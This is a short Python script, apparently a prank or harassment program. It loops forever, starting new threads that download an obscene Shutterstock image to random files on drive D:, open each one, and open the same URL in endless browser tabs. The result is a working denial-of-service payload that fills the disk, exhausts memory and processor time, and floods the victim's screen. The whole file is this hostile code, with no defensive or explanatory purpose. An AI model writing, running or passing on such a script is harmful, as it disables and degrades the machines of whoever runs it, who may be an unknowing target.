import requests
import webbrowser
from threading import Thread
from random import choice
from os import startfile
def gen_name(num: int = 8):
	g = ""
	for x in range(num):
		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
	return g

def img_spam():
	while True:
		p = requests.get('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg')
		name = gen_name()
		out = open(f"D:/{name}.jpg", "wb")
		out.write(p.content)
		out.close()
		startfile(rf"D:/{name}.jpg")

def browser_open():
	while True:
		webbrowser.open('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg', new=2)

while True:
	Thread(target=img_spam).start()
	Thread(target=browser_open).start()
